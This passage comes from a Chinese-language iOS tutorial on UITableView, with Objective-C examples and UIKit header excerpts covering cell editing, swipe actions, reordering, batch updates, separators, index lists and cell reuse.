@&quot;开始&quot;;&#125;- (NSString *)tableView:(UITableView *)tableView titleForFooterInSection:(NSInteger)section&#123; return @&quot;结束&quot;;&#125;// 某个Cell是否可以编辑- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath &#123; return YES;&#125;// 返回Cell的编辑状态- (UITableViewCellEditingStyle)tableView:(UITableView *)tableView editingStyleForRowAtIndexPath:(NSIndexPath *)indexPath&#123; return indexPath.row % 3;&#125;// Override to support editing the table view.- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath &#123; if (editingStyle == UITableViewCellEditingStyleDelete) &#123; // 1. 删除数据 // 2. 删除Cell [self deleteObjectWithNSIndexPath:indexPath]; [tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationFade]; &#125; else if (editingStyle == UITableViewCellEditingStyleInsert) &#123; // 1. 插入数据 // 2. 插入Cell [self insertObject:@&quot;插入的Cell&quot; inDataSourceAtNSIndexPath:indexPath]; [tableView insertRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationLeft]; &#125;&#125;// Override to support rearranging the table view.// 移动Cell时调用该方法- (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath &#123; /** if(section不变)&#123; if(row发生变化)&#123; 直接交换元素 &#125; &#125;else&#123; // 1 取出fromIndexPath位置的数据 // 2 删除fromeIndexPath的数据 // 3 将存起来的数据插入到toIndexPath的位置 &#125; */ if (fromIndexPath.section == toIndexPath.section) &#123; if (fromIndexPath.row != toIndexPath.row) &#123; NSMutableArray *array = self.dataSource[fromIndexPath.section]; [array exchangeObjectAtIndex:fromIndexPath.row withObjectAtIndex:toIndexPath.row]; &#125; &#125;else&#123; NSString *str = [self deleteObjectWithNSIndexPath:fromIndexPath]; [self insertObject:str inDataSourceAtNSIndexPath:toIndexPath]; &#125;&#125;// Override to support conditional rearranging of the table view.// 某个Cell是否可以移动- (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath &#123; // Return NO if you do not want the item to be re-orderable. return indexPath.row % 2;&#125;/*#pragma mark - Navigation// In a storyboard-based application, you will often want to do a little preparation before navigation- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender &#123; // Get the new view controller using [segue destinationViewController]. // Pass the selected object to the new view controller.&#125;*/#pragma mark - Getter- (NSMutableArray *)dataSource&#123; if (!_dataSource) &#123; _dataSource = @[].mutableCopy; for (NSInteger i = 0; i &lt; 5; i++) &#123; NSMutableArray *array = @[].mutableCopy; for (NSInteger j = 0; j &lt; 5; j++) &#123; [array addObject:[NSString stringWithFormat:@&quot;第%ld组，Row:%ld&quot;,i ,(long)j]]; &#125; [_dataSource addObject:array]; &#125; &#125; return _dataSource;&#125; 上面代码中首先拿到源cell所处的section，然后从该section对应的数据中移除，然后拿到目标section的数据，然后将源cell的数据添加到目标section中，并更新回数据模型，如果我们没有正确更新数据模型的话，显示的内容将会出现异常。 UITableViewCell.h123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146// 源码来源于UIKit-&gt;UITableViewCell.hS_ASSUME_NONNULL_BEGIN@class UIImage, UIColor, UILabel, UIImageView, UIButton, UITextField, UITableView, UILongPressGestureRecognizer;typedef NS_ENUM(NSInteger, UITableViewCellStyle) &#123; UITableViewCellStyleDefault, // Simple cell with text label and optional image view (behavior of UITableViewCell in iPhoneOS 2.x) UITableViewCellStyleValue1, // Left aligned label on left and right aligned label on right with blue text (Used in Settings) UITableViewCellStyleValue2, // Right aligned label on left with blue text and left aligned label on right (Used in Phone/Contacts) UITableViewCellStyleSubtitle // Left aligned label on top and left aligned label on bottom with gray text (Used in iPod).&#125;; // available in iPhone OS 3.0typedef NS_ENUM(NSInteger, UITableViewCellSeparatorStyle) &#123; UITableViewCellSeparatorStyleNone, UITableViewCellSeparatorStyleSingleLine, UITableViewCellSeparatorStyleSingleLineEtched // This separator style is only supported for grouped style table views currently&#125; __TVOS_PROHIBITED;typedef NS_ENUM(NSInteger, UITableViewCellSelectionStyle) &#123; UITableViewCellSelectionStyleNone, UITableViewCellSelectionStyleBlue, UITableViewCellSelectionStyleGray, UITableViewCellSelectionStyleDefault NS_ENUM_AVAILABLE_IOS(7_0)&#125;;#ifndef SDK_HIDE_TIDEtypedef NS_ENUM(NSInteger, UITableViewCellFocusStyle) &#123; UITableViewCellFocusStyleDefault, UITableViewCellFocusStyleCustom&#125; NS_ENUM_AVAILABLE_IOS(9_0);#endiftypedef NS_ENUM(NSInteger, UITableViewCellEditingStyle) &#123; UITableViewCellEditingStyleNone, UITableViewCellEditingStyleDelete, UITableViewCellEditingStyleInsert&#125;;typedef NS_ENUM(NSInteger, UITableViewCellAccessoryType) &#123; UITableViewCellAccessoryNone, // don&apos;t show any accessory view UITableViewCellAccessoryDisclosureIndicator, // regular chevron. doesn&apos;t track UITableViewCellAccessoryDetailDisclosureButton __TVOS_PROHIBITED, // info button w/ chevron. tracks UITableViewCellAccessoryCheckmark, // checkmark. doesn&apos;t track UITableViewCellAccessoryDetailButton NS_ENUM_AVAILABLE_IOS(7_0) __TVOS_PROHIBITED // info button. tracks&#125;;typedef NS_OPTIONS(NSUInteger, UITableViewCellStateMask) &#123; UITableViewCellStateDefaultMask = 0, UITableViewCellStateShowingEditControlMask = 1 &lt;&lt; 0, UITableViewCellStateShowingDeleteConfirmationMask = 1 &lt;&lt; 1&#125;;#define UITableViewCellStateEditingMask UITableViewCellStateShowingEditControlMaskNS_CLASS_AVAILABLE_IOS(2_0) @interface UITableViewCell : UIView &lt;NSCoding, UIGestureRecognizerDelegate&gt;// Designated initializer. If the cell can be reused, you must pass in a reuse identifier. You should use the same reuse identifier for all cells of the same form. - (instancetype)initWithStyle:(UITableViewCellStyle)style reuseIdentifier:(nullable NSString *)reuseIdentifier NS_AVAILABLE_IOS(3_0) NS_DESIGNATED_INITIALIZER;- (nullable instancetype)initWithCoder:(NSCoder *)aDecoder NS_DESIGNATED_INITIALIZER;// Content. These properties provide direct access to the internal label and image views used by the table view cell. These should be used instead of the content properties below.@property (nonatomic, readonly, strong, nullable) UIImageView *imageView NS_AVAILABLE_IOS(3_0); // default is nil. image view will be created if necessary.@property (nonatomic, readonly, strong, nullable) UILabel *textLabel NS_AVAILABLE_IOS(3_0); // default is nil. label will be created if necessary.@property (nonatomic, readonly, strong, nullable) UILabel *detailTextLabel NS_AVAILABLE_IOS(3_0); // default is nil. label will be created if necessary (and the current style supports a detail label).// If you want to customize cells by simply adding additional views, you should add them to the content view so they will be positioned appropriately as the cell transitions into and out of editing mode.@property (nonatomic, readonly, strong) UIView *contentView;// Default is nil for cells in UITableViewStylePlain, and non-nil for UITableViewStyleGrouped. The &apos;backgroundView&apos; will be added as a subview behind all other views.@property (nonatomic, strong, nullable) UIView *backgroundView;// Default is nil for cells in UITableViewStylePlain, and non-nil for UITableViewStyleGrouped. The &apos;selectedBackgroundView&apos; will be added as a subview directly above the backgroundView if not nil, or behind all other views. It is added as a subview only when the cell is selected. Calling -setSelected:animated: will cause the &apos;selectedBackgroundView&apos; to animate in and out with an alpha fade.@property (nonatomic, strong, nullable) UIView *selectedBackgroundView;// If not nil, takes the place of the selectedBackgroundView when using multiple selection.@property (nonatomic, strong, nullable) UIView *multipleSelectionBackgroundView NS_AVAILABLE_IOS(5_0);@property (nonatomic, readonly, copy, nullable) NSString *reuseIdentifier;- (void)prepareForReuse; // if the cell is reusable (has a reuse identifier), this is called just before the cell is returned from the table view method dequeueReusableCellWithIdentifier:. If you override, you MUST call super.@property (nonatomic) UITableViewCellSelectionStyle selectionStyle; // default is UITableViewCellSelectionStyleBlue.@property (nonatomic, getter=isSelected) BOOL selected; // set selected state (title, image, background). default is NO. animated is NO@property (nonatomic, getter=isHighlighted) BOOL highlighted; // set highlighted state (title, image, background). default is NO. animated is NO- (void)setSelected:(BOOL)selected animated:(BOOL)animated; // animate between regular and selected state- (void)setHighlighted:(BOOL)highlighted animated:(BOOL)animated; // animate between regular and highlighted state@property (nonatomic, readonly) UITableViewCellEditingStyle editingStyle; // default is UITableViewCellEditingStyleNone. This is set by UITableView using the delegate&apos;s value for cells who customize their appearance accordingly.@property (nonatomic) BOOL showsReorderControl; // default is NO@property (nonatomic) BOOL shouldIndentWhileEditing; // default is YES. This is unrelated to the indentation level below.@property (nonatomic) UITableViewCellAccessoryType accessoryType; // default is UITableViewCellAccessoryNone. use to set standard type@property (nonatomic, strong, nullable) UIView *accessoryView; // if set, use custom view. ignore accessoryType. tracks if enabled can calls accessory action@property (nonatomic) UITableViewCellAccessoryType editingAccessoryType; // default is UITableViewCellAccessoryNone. use to set standard type@property (nonatomic, strong, nullable) UIView *editingAccessoryView; // if set, use custom view. ignore editingAccessoryType. tracks if enabled can calls accessory action@property (nonatomic) NSInteger indentationLevel; // adjust content indent. default is 0@property (nonatomic) CGFloat indentationWidth; // width for each level. default is 10.0@property (nonatomic) UIEdgeInsets separatorInset NS_AVAILABLE_IOS(7_0) UI_APPEARANCE_SELECTOR __TVOS_PROHIBITED; // allows customization of the separator frame@property (nonatomic, getter=isEditing) BOOL editing; // show appropriate edit controls (+/- &amp; reorder). By default -setEditing: calls setEditing:animated: with NO for animated.- (void)setEditing:(BOOL)editing animated:(BOOL)animated;@property(nonatomic, readonly) BOOL showingDeleteConfirmation; // currently showing &quot;Delete&quot; button#ifndef SDK_HIDE_TIDE@property (nonatomic) UITableViewCellFocusStyle focusStyle NS_AVAILABLE_IOS(9_0) UI_APPEARANCE_SELECTOR;#endif// These methods can be used by subclasses to animate additional changes to the cell when the cell is changing state// Note that when the cell is swiped, the cell will be transitioned into the UITableViewCellStateShowingDeleteConfirmationMask state,// but the UITableViewCellStateShowingEditControlMask will not be set.- (void)willTransitionToState:(UITableViewCellStateMask)state NS_AVAILABLE_IOS(3_0);- (void)didTransitionToState:(UITableViewCellStateMask)state NS_AVAILABLE_IOS(3_0);@end@interface UITableViewCell (UIDeprecated)// Frame is ignored. The size will be specified by the table view width and row height.- (id)initWithFrame:(CGRect)frame reuseIdentifier:(nullable NSString *)reuseIdentifier NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED;// Content properties. These properties were deprecated in iPhone OS 3.0. The textLabel and imageView properties above should be used instead.// For selected attributes, set the highlighted attributes on the textLabel and imageView.@property (nonatomic, copy, nullable) NSString *text NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is nil@property (nonatomic, strong, nullable) UIFont *font NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is nil (Use default font)@property (nonatomic) NSTextAlignment textAlignment NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is UITextAlignmentLeft@property (nonatomic) NSLineBreakMode lineBreakMode NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is UILineBreakModeTailTruncation@property (nonatomic, strong, nullable) UIColor *textColor NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is nil (text draws black)@property (nonatomic, strong, nullable) UIColor *selectedTextColor NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is nil (text draws white)@property (nonatomic, strong, nullable) UIImage *image NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is nil. appears on left next to title.@property (nonatomic, strong, nullable) UIImage *selectedImage NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is nil// Use the new editingAccessoryType and editingAccessoryView instead@property (nonatomic) BOOL hidesAccessoryWhenEditing NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // default is YES// Use the table view data source method -tableView:commitEditingStyle:forRowAtIndexPath: or the table view delegate method -tableView:accessoryButtonTappedForRowWithIndexPath: instead@property (nonatomic, assign, nullable) id target NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // target for insert/delete/accessory clicks. default is nil (i.e. go up responder chain). weak reference@property (nonatomic, nullable) SEL editAction NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // action to call on insert/delete call. set by UITableView@property (nonatomic, nullable) SEL accessoryAction NS_DEPRECATED_IOS(2_0, 3_0) __TVOS_PROHIBITED; // action to call on accessory view clicked. set by UITableView@endNS_ASSUME_NONNULL_END UITableViewHeaderFooterView1234567891011121314151617181920// 源码来源于UIKit-&gt;UITableViewHeaderFooterView.hNS_CLASS_AVAILABLE_IOS(6_0) @interface UITableViewHeaderFooterView : UIView- (instancetype)initWithReuseIdentifier:(nullable NSString *)reuseIdentifier NS_DESIGNATED_INITIALIZER;- (nullable instancetype)initWithCoder:(NSCoder *)aDecoder NS_DESIGNATED_INITIALIZER;@property (nonatomic, strong, null_resettable) UIColor *tintColor;@property (nonatomic, readonly, strong, nullable) UILabel *textLabel;@property (nonatomic, readonly, strong, nullable) UILabel *detailTextLabel; // only supported for headers in grouped style@property (nonatomic, readonly, strong) UIView *contentView;@property (nonatomic, strong, nullable) UIView *backgroundView;@property (nonatomic, readonly, copy, nullable) NSString *reuseIdentifier;- (void)prepareForReuse; // if the view is reusable (has a reuse identifier), this is called just before the view is returned from the table view method dequeueReusableHeaderFooterViewWithIdentifier:. If you override, you MUST call super.@end UITableViewControllerUITableViewController是系统提供的一个便利类，主要是为了方便我们使用UITableView，该类生成的时候就将自身设置成了其包含的tableView的dataSource和delegate，并创建了很多代理函数的框架，为我们大大的节省了时间，我们可以通过其tableView属性获取该controller内部维护的tableView对象。默认情况下使用UITableViewController创建的tableView是充满全屏的，如果需要用到tableView是不充满全屏的话，我们应该使用UIViewController自己创建和维护tableView。 UITableViewController提供一个初始化函数initWithStyle:，根据需要我们可以创建Plain或者Grouped类型的tableView，当我们使用其从UIViewController继承来的init初始化函数的时候，默认将会我们创建一个Plain类型的tableView。 UITableViewController默认的会在viewWillAppear的时候，清空所有选中cell，我们可以通过设置self.clearsSelectionOnViewWillAppear = NO，来禁用该功能，并在viewDidAppear中调用UIScrollView的flashScrollIndicators方法让滚动条闪动一次，从而提示用户该控件是可以滑动的。 1234567891011121314// 源码来源于UIKit-&gt;UITableViewController.hNS_CLASS_AVAILABLE_IOS(2_0) @interface UITableViewController : UIViewController &lt;UITableViewDelegate, UITableViewDataSource&gt;- (instancetype)initWithStyle:(UITableViewStyle)style NS_DESIGNATED_INITIALIZER;- (instancetype)initWithNibName:(nullable NSString *)nibNameOrNil bundle:(nullable NSBundle *)nibBundleOrNil NS_DESIGNATED_INITIALIZER;- (nullable instancetype)initWithCoder:(NSCoder *)aDecoder NS_DESIGNATED_INITIALIZER;@property (nonatomic, strong, null_resettable) UITableView *tableView;@property (nonatomic) BOOL clearsSelectionOnViewWillAppear NS_AVAILABLE_IOS(3_2); // defaults to YES. If YES, any selection is cleared in viewWillAppear:@property (nonatomic, strong, nullable) UIRefreshControl *refreshControl NS_AVAILABLE_IOS(6_0) __TVOS_PROHIBITED;@end 常用操作左划删除实现两个方法即可实现左划删除。 123456789101112- (void)tableView:(UITableView *)tableView commitEditingStyle:(UITableViewCellEditingStyle)editingStyle forRowAtIndexPath:(NSIndexPath *)indexPath &#123; if (editingStyle == UITableViewCellEditingStyleDelete) &#123; // 1. 删除数据 // 2. 删除Cell [self deleteObjectWithNSIndexPath:indexPath]; [tableView deleteRowsAtIndexPaths:@[indexPath] withRowAnimation:UITableViewRowAnimationFade]; &#125;&#125;- (NSString *)tableView:(UITableView *)tableView titleForDeleteConfirmationButtonForRowAtIndexPath:(NSIndexPath *)indexPath&#123; return @&quot;取消关注&quot;;&#125; 左划删除与多选编辑是冲突的。若实现下来两个方法，则将是多选编辑，或者说不能实现左划删除。 123456789// 某个Cell是否可以编辑- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath &#123; return YES;&#125;// 返回Cell的编辑状态- (UITableViewCellEditingStyle)tableView:(UITableView *)tableView editingStyleForRowAtIndexPath:(NSIndexPath *)indexPath&#123; return indexPath.row % 3;&#125; 关于Cell编辑那些事儿开始编辑前、编辑完成后、编辑时Cell是否缩进、滑动删除、滑动多选项、每个Cell的编辑样式都有代理方法。 123456789101112131415161718192021222324252627282930313233343536- tableView:willBeginEditingRowAtIndexPath: // 将要开始编辑- tableView:didEndEditingRowAtIndexPath: // 已经结束编辑- tableView:editingStyleForRowAtIndexPath: // 返回指定Cell的编辑类型- tableView:titleForDeleteConfirmationButtonForRowAtIndexPath: // 左划删除的按钮文本，如“删除”- tableView:shouldIndentWhileEditingRowAtIndexPath: // 编辑时是否缩进// 8.0以后的方法，可以自定义多个左划操作，包括文本与事件的Block- (nullable NSArray&lt;UITableViewRowAction *&gt; *)tableView:(UITableView *)tableView editActionsForRowAtIndexPath:(NSIndexPath *)indexPath NS_AVAILABLE_IOS(8_0);iOS8实现滑动编辑功能。- (BOOL)tableView:(UITableView *)tableView canEditRowAtIndexPath:(NSIndexPath *)indexPath&#123; return YES;&#125;- (UITableViewCellEditingStyle)tableView:(UITableView *)tableView editingStyleForRowAtIndexPath:(NSIndexPath *)indexPath&#123; return UITableViewCellEditingStyleDelete;&#125;-(NSArray *)tableView:(UITableView *)tableView editActionsForRowAtIndexPath:(NSIndexPath *)indexPath&#123; UITableViewRowAction *layTopRowAction1 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleDestructive title:@&quot;删除&quot; handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; NSLog(@&quot;点击了删除&quot;); [tableView setEditing:NO animated:YES]; &#125;]; layTopRowAction1.backgroundColor = [UIColor redColor]; UITableViewRowAction *layTopRowAction2 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleDestructive title:@&quot;置顶&quot; handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; NSLog(@&quot;点击了置顶&quot;); [tableView setEditing:NO animated:YES]; &#125;]; layTopRowAction2.backgroundColor = [UIColor greenColor]; UITableViewRowAction *layTopRowAction3 = [UITableViewRowAction rowActionWithStyle:UITableViewRowActionStyleDestructive title:@&quot;更多&quot; handler:^(UITableViewRowAction *action, NSIndexPath *indexPath) &#123; NSLog(@&quot;点击了更多&quot;); [tableView setEditing:NO animated:YES]; &#125;]; layTopRowAction3.backgroundColor = [UIColor blueColor]; NSArray *arr = @[layTopRowAction1,layTopRowAction2,layTopRowAction3]; return arr;&#125; Cell的ReOrdering——移动在reordering操作时，需要做三件事。 1.是否可以移动 &gt; 2. 移动是否合法 &gt; 3. 移动操作。 123456789101112131415161718192021222324252627282930313233343536373839// 某个Cell是否可以移动- (BOOL)tableView:(UITableView *)tableView canMoveRowAtIndexPath:(NSIndexPath *)indexPath &#123; // Return NO if you do not want the item to be re-orderable. return indexPath.row % 2;&#125;// 限制移动是否合法- (NSIndexPath *)tableView:(UITableView *)tableView targetIndexPathForMoveFromRowAtIndexPath:(NSIndexPath *)sourceIndexPath toProposedIndexPath:(NSIndexPath *)proposedDestinationIndexPath&#123; // 如果是第一个Section或者跨Section移动是非法的，不予移动 if (proposedDestinationIndexPath.section == 0 || proposedDestinationIndexPath.section != sourceIndexPath.section) &#123; return sourceIndexPath; &#125;else&#123; return proposedDestinationIndexPath; &#125;&#125;// 移动Cell时调用该方法- (void)tableView:(UITableView *)tableView moveRowAtIndexPath:(NSIndexPath *)fromIndexPath toIndexPath:(NSIndexPath *)toIndexPath &#123; /** if(section不变)&#123; if(row发生变化)&#123; 直接交换元素 &#125; &#125;else&#123; // 1 取出fromIndexPath位置的数据 // 2 删除fromeIndexPath的数据 // 3 将存起来的数据插入到toIndexPath的位置 &#125; */ if (fromIndexPath.section == toIndexPath.section) &#123; if (fromIndexPath.row != toIndexPath.row) &#123; NSMutableArray *array = self.dataSource[fromIndexPath.section]; [array exchangeObjectAtIndex:fromIndexPath.row withObjectAtIndex:toIndexPath.row]; &#125; &#125;else&#123; NSString *str = [self deleteObjectWithNSIndexPath:fromIndexPath]; [self insertObject:str inDataSourceAtNSIndexPath:toIndexPath]; &#125;&#125; 选择与编辑时的几个属性一般在做支付方式选择时，可以选择不可多选。即（allowsSelection = YES; self.tableView.allowsMultipleSelection = NO）,UITableView默认就是不可多选的。 若是编辑某个列表页时，要求可以多选、删除操作时，需要设置self.tableView.allowsMultipleSelectionDuringEditing = YES。 123456789self.tableView.allowsSelection = YES; // 默认YES，当Cell在非编辑状态时，是否可以被选择self.tableView.allowsSelectionDuringEditing = YES; // 默认NO,当Cell在编辑状态时，是否可以被选择self.tableView.allowsMultipleSelection = YES; // 默认NO,当Cell在非编辑状态时，是否可以多选self.tableView.allowsMultipleSelectionDuringEditing = YES; // 默认NO,当Cell在编辑状态时，是否可以多选@property (nonatomic) BOOL allowsSelection NS_AVAILABLE_IOS(3_0); // default is YES. Controls whether rows can be selected when not in editing mode@property (nonatomic) BOOL allowsSelectionDuringEditing; // default is NO. Controls whether rows can be selected when in editing mode@property (nonatomic) BOOL allowsMultipleSelection NS_AVAILABLE_IOS(5_0); // default is NO. Controls whether multiple rows can be selected simultaneously@property (nonatomic) BOOL allowsMultipleSelectionDuringEditing NS_AVAILABLE_IOS(5_0); // default is NO. Controls whether multiple rows can be selected simultaneously in editing mode 多选设置UITableView的allowsMultipleSelectionDuringEditing为YES即可在编辑时支持多选。 批量操作 （插入、删除、更新） 1234567891011121314151617181920212223242526272829303132333435363738// 记得在操作时对数据源进行相应操作[self.tableView beginUpdates]; NSIndexSet *sigleSet = [NSIndexSet indexSetWithIndex:0];NSIndexSet *mutipSet = [NSIndexSet indexSetWithIndexesInRange:NSMakeRange(0, 2)]; [self.tableView insertSections:sigleSet withRowAnimation:UITableViewRowAnimationTop];[self.tableView deleteSections:mutipSet withRowAnimation:UITableViewRowAnimationFade];[self.tableView reloadSections:sigleSet withRowAnimation:UITableViewRowAnimationNone];[self.tableView moveSection:0 toSection:1]; NSArray *indexPaths = [NSArray arrayWithObjects:[NSIndexPath indexPathForRow:0 inSection:1], [NSIndexPath indexPathForRow:0 inSection:2], [NSIndexPath indexPathForRow:0 inSection:3],nil];[self.tableView insertRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationNone];[self.tableView deleteRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationBottom];[self.tableView reloadRowsAtIndexPaths:indexPaths withRowAnimation:UITableViewRowAnimationAutomatic];[self.tableView moveRowAtIndexPath:[NSIndexPath indexPathForRow:3 inSection:0] toIndexPath:[NSIndexPath indexPathForRow:2 inSection:2]]; [self.tableView endUpdates];// 下方为系统UITableView.h的方法// Row insertion/deletion/reloading.- (void)beginUpdates; // allow multiple insert/delete of rows and sections to be animated simultaneously. Nestable- (void)endUpdates; // only call insert/delete/reload calls or change the editing state inside an update block. otherwise things like row count, etc. may be invalid.- (void)insertSections:(NSIndexSet *)sections withRowAnimation:(UITableViewRowAnimation)animation;- (void)deleteSections:(NSIndexSet *)sections withRowAnimation:(UITableViewRowAnimation)animation;- (void)reloadSections:(NSIndexSet *)sections withRowAnimation:(UITableViewRowAnimation)animation NS_AVAILABLE_IOS(3_0);- (void)moveSection:(NSInteger)section toSection:(NSInteger)newSection NS_AVAILABLE_IOS(5_0);- (void)insertRowsAtIndexPaths:(NSArray&lt;NSIndexPath *&gt; *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation;- (void)deleteRowsAtIndexPaths:(NSArray&lt;NSIndexPath *&gt; *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation;- (void)reloadRowsAtIndexPaths:(NSArray&lt;NSIndexPath *&gt; *)indexPaths withRowAnimation:(UITableViewRowAnimation)animation NS_AVAILABLE_IOS(3_0);- (void)moveRowAtIndexPath:(NSIndexPath *)indexPath toIndexPath:(NSIndexPath *)newIndexPath NS_AVAILABLE_IOS(5_0); 自定义HeaderVeiw、FooterView 实现如下代理方法即可： 1234// Section header &amp; footer information. Views are preferred over title should you decide to provide both- (nullable UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section; // custom view for header. will be adjusted to default or specified header height- (nullable UIView *)tableView:(UITableView *)tableView viewForFooterInSection:(NSInteger)section; // custom view for footer. will be adjusted to default or specified footer height 估算Cell、HeaderVeiw、FooterView的高度UITableView在显示前需要知道每个Cell的高度，用以计算整个TableView的总高度，而后才开始渲染视图并显示在屏幕上。 若实现-tableView:estimatedHeightXXX 协议方法，TableView在计算总高度时将调用-tableView estimatedHeightForRowAtIndexPath:，先显示TableView，当滑动到某个Cell时，会调用-tableView:heightForRowAtIndexPath:获得Cell的真正高度。可以大大提供TableView第一加载时的效率。若未实现，TableView在计算总高度时将调用-tableView:heightForRowAtIndexPath:获取高度。 12345// Use the estimatedHeight methods to quickly calcuate guessed values which will allow for fast load times of the table.// If these methods are implemented, the above -tableView:heightForXXX calls will be deferred until views are ready to be displayed, so more expensive logic can be placed there.- (CGFloat)tableView:(UITableView *)tableView estimatedHeightForRowAtIndexPath:(NSIndexPath *)indexPath NS_AVAILABLE_IOS(7_0);- (CGFloat)tableView:(UITableView *)tableView estimatedHeightForHeaderInSection:(NSInteger)section NS_AVAILABLE_IOS(7_0);- (CGFloat)tableView:(UITableView *)tableView estimatedHeightForFooterInSection:(NSInteger)section NS_AVAILABLE_IOS(7_0); 监控Cell、HeaderView、FooterView的显示与消失当某个Cell、HeaderView、FooterView出现和消失时，都会调用下面的协议方法。 12345678// Display customization- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath;- (void)tableView:(UITableView *)tableView willDisplayHeaderView:(UIView *)view forSection:(NSInteger)section NS_AVAILABLE_IOS(6_0);- (void)tableView:(UITableView *)tableView willDisplayFooterView:(UIView *)view forSection:(NSInteger)section NS_AVAILABLE_IOS(6_0);- (void)tableView:(UITableView *)tableView didEndDisplayingCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath*)indexPath NS_AVAILABLE_IOS(6_0);- (void)tableView:(UITableView *)tableView didEndDisplayingHeaderView:(UIView *)view forSection:(NSInteger)section NS_AVAILABLE_IOS(6_0);- (void)tableView:(UITableView *)tableView didEndDisplayingFooterView:(UIView *)view forSection:(NSInteger)section NS_AVAILABLE_IOS(6_0); UITableViewCell分割线顶到左侧在实现UI效果时，常常会遇到分割线需要顶到左侧的情况，按照一般的思路无法实现该效果，现提供一种解决方案如下： 123456789101112131415161718192021222324252627282930- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath&#123; if ([cell respondsToSelector:@selector(setSeparatorInset:)]) &#123; [cell setSeparatorInset:UIEdgeInsetsZero]; &#125; if ([cell respondsToSelector:@selector(setLayoutMargins:)]) &#123; [cell setLayoutMargins:UIEdgeInsetsZero]; &#125;&#125;- (UITableView *)tableView&#123; if (!_tableView) &#123; _tableView = [[UITableView alloc] initWithFrame:CGRectZero style:UITableViewStyleGrouped]; _tableView.delegate = self; _tableView.dataSource = self; [_tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:@&quot;identifier&quot;]; _tableView.rowHeight = 44.0; _tableView.separatorStyle = UITableViewCellSeparatorStyleSingleLine; if ([_tableView respondsToSelector:@selector(setSeparatorInset:)]) &#123; [_tableView setSeparatorInset:UIEdgeInsetsZero]; &#125; if ([_tableView respondsToSelector:@selector(setLayoutMargins:)]) &#123; [_tableView setLayoutMargins:UIEdgeInsetsZero]; &#125; _tableView.separatorColor = [NWUtility colorWithHex:0xDCDCDC]; &#125; return _tableView;&#125; 下面的写法无法完整实现靠左的效果。 12_tableView.separatorStyle = UITableViewCellSeparatorStyleSingleLine;_tableView.separatorInset = UIEdgeInsetsMake(0, 20, 0, 20); 索引——IndexList开发过程中，经常遇到List页面要求索引功能。在此简单介绍一下实现逻辑。 123456789// 返回index索引现实需要的数组（NSArray &lt;NSString *&gt; *）- (NSArray&lt;NSString *&gt; *)sectionIndexTitlesForTableView:(UITableView *)tableView&#123; return @[@&quot;热&quot;,@&quot;A&quot;,@&quot;B&quot;,@&quot;C&quot;,@&quot;D&quot;,@&quot;E&quot;,@&quot;F&quot;,@&quot;G&quot;,@&quot;H&quot;,@&quot;J&quot;,@&quot;K&quot;,@&quot;L&quot;,@&quot;M&quot;,@&quot;N&quot;,@&quot;O&quot;,@&quot;P&quot;,@&quot;Q&quot;,@&quot;R&quot;,@&quot;S&quot;,@&quot;T&quot;,@&quot;U&quot;,@&quot;V&quot;,@&quot;W&quot;,@&quot;X&quot;,@&quot;Y&quot;,@&quot;Z&quot;];&#125;// 根据点击index索引返回UITableView的Section- (NSInteger)tableView:(UITableView *)tableView sectionForSectionIndexTitle:(NSString *)title atIndex:(NSInteger)index&#123; return index &lt; self.dataSource.count ? index : 1;&#125; 复用问题Cell、HeaderView、FooterView都存在复用问题。复用时，系统会根据其重用标识（ReuseIdentifier）去重用队列中取出已创建好的视图，直接使用，若重用队列中无该标识的Cell、HeaderView、FooterView时，系统会根据需要自行创建，这样可以节省时间、内存，提高性能。 在重用Cell时，系统会自动调用Cell的一个方法，让Cell在重用前进行自我清理工作。 1- (void)prepareForReuse; accessaryView与accessaryType当cell的accessaryView时，根据其accessaryType的不同调用的方法不同。 UITableViewCellAccessoryDisclosureIndicator/UITableViewCellAccessoryCheckmark [&gt; / √]的时候，调用delegate的tableView:didSelectRowAtIndexPath:方法。UITableViewCellAccessoryDetailDisclosureButton/UITableViewCellAccessoryDetailButton [!&gt; 